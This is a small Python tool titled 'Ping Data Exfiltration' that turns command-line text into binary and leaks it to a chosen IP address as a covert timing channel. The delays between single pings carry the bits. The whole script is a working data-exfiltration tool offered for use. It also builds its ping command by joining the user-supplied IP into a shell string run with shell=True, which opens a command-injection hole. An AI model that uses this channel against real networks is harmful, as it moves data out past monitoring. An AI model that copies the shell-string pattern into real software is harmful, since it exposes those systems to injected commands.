"""
Ping Data Exfiltration
This script will allow you to convert data into pings, like morse code
Martino Jones 20180105


"""

import argparse
import subprocess
from os import devnull
from sys import argv
from time import sleep

# Arguments the user can pass in to slightly modify the runtime
parser = argparse.ArgumentParser(description='ICMPExfil encode and send script.')
parser.add_argument('--wait', type=int,
                    help='Number of additional seconds to wait for leeway.')
parser.add_argument('--ip', type=str,
                    help='IP Address to send ping, defaults to loopback address.')
parser.add_argument('--show', action='store_true',
                    help='Shows the pings if you would like output.')
args = parser.parse_args()

# Seconds of additional time to wait in-between pings
wait = 0
# This is the IP address you wish to ping
ipToPing = "127.0.0.1"
# Array of binary to be used for timing
dataArray = []
# Should the script output the ping stdout
show = False

# Get additional wait time if user provided is
if args.wait:
    wait = int(args.wait)
if args.ip:
    ipToPing = args.ip
if args.show:
    show = True


def main():
    print("Encoding data")

    # Convert the data into numbers
    for args in argv[1:]:
        # Split the data by character and add to our dataArray
        for line in args:
            for entry in line:
                # Make sure everything is a number, convert if not
                dataArray.append(''.join(s for s in iter_bin(entry)))
    ping(dataArray)


def iter_bin(s):
    sb = s.encode('ascii')
    return (format(b, '07b') for b in sb)


def ping(data):
    print("Sending pings please wait...")

    # Decide to show or not based on user input
    if not show:
        FNULL = open(devnull, 'w')
    else:
        FNULL = None

    # Being sending
    for line in data:
        for char in line:
            # Run systems ping, not writing my own and send to devnull
            subprocess.call(["ping -c 1 " + ipToPing], shell=True, stdout=FNULL)

            # Sleep for the desired amount of time
            sleep(int(char) + wait)
    subprocess.call(["ping -c 1 " + ipToPing], shell=True, stdout=FNULL)
    print(dataArray)


if __name__ == '__main__':
    main()
